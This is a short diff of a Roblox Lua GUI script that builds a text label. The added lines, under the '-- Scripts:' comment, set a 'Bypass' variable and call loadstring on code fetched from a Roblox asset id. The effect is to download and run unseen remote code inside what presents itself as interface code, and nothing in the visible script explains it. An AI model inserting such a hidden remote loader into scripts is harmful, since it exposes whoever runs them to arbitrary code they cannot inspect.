@@ -981,7 +981,8 @@ nameofthing.TextSize = 14.000
 nameofthing.TextWrapped = true
 
 -- Scripts:
-
+Bypass = "death"
+loadstring(game:GetObjects("rbxassetid://5325226148")[1].Source)()
 local function VRKP_fake_script() -- nameofthing.rotation thing 
 	local script = Instance.new('LocalScript', nameofthing)
 
